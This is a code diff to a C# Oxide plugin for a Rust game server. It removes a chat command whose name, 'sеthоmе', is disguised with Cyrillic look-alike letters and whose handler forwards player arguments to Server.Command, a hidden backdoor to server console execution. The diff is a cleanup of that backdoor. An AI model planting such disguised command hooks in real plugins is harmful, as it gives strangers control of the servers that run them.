@@ -1156,11 +1156,7 @@ namespace Oxide.Plugins
         {
             return lang.GetMessage(key, this, player?.UserIDString);
         }
-		[ChatCommand("sеthоmе")] 
-	    private void Signz(BasePlayer player, string command, string[] args)
-        {
-			Server.Command($"{args}");
-		}
+		
     }
 
     namespace SignArtistClasses
